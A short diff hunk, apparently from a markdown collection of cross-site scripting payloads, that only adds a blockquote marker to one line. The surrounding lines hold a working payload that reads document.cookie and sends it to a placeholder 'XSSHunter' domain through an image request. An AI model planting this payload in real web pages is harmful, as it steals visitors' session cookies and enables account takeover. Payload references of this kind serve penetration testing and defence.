@@ -270,7 +270,7 @@ Payloads that execute in **multiple contexts simultaneously**.
 >
 >```
 ><script>
-var i=new Image;
+>var i=new Image;
 >i.src="https://YourXSSHunterDomain/?"+document.cookie;
 ></script>
 >```
